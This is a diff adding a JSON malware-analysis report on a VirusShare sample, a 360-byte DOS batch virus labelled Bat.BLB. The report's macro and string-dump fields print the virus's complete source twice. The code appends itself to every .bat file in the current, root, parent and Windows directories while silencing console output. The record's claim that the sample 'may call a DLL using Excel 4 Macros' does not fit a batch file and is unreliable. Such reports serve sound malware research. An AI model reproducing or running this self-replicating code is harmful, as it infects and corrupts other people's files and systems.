@@ -1,0 +1,48 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@echo off > nul.blb\nctty nul > nul.blb\nif \"%1==\"/blbost goto jedem_blb\nfor %%v in (*.bat \\*.bat ..\\*.bat %windir%\\*.bat) do call %0 /blbost %%v\ngoto end_blb\n:jedem_blb\nfind \"blb\"<%2> nul\nif errorlevel 1 goto inf_blb\ngoto end_blb\n:inf_blb\nset blb=%2\nfind \"blb\"<%0>>%2\nif errorlevel 1 find \"blb\"<%0>>%blb%\n:end_blb\n::Bat.BLB by Mimi/MIONS ...leider"
+    },
+    "filename": "VirusShare_43eac313bfbe2cadc0629d58bf948c9c",
+    "filesize": 360,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "43eac313bfbe2cadc0629d58bf948c9c",
+        "sha1": "08ed5d4bcafda8fe3f27c673edeb5570f1affc91",
+        "sha256": "672141310ecd8c34ff90fef0793f9355370c0926f6128875bb259a6252779d03"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off > nul.blb",
+            "ctty nul > nul.blb",
+            "if \"%1==\"/blbost goto jedem_blb",
+            "for %%v in (*.bat \\*.bat ..\\*.bat %windir%\\*.bat) do call %0 /blbost %%v",
+            "goto end_blb",
+            ":jedem_blb",
+            "find \"blb\"<%2> nul",
+            "if errorlevel 1 goto inf_blb",
+            "goto end_blb",
+            ":inf_blb",
+            "set blb=%2",
+            "find \"blb\"<%0>>%2",
+            "if errorlevel 1 find \"blb\"<%0>>%blb%",
+            ":end_blb",
+            "::Bat.BLB by Mimi/MIONS ...leider"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.255670",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
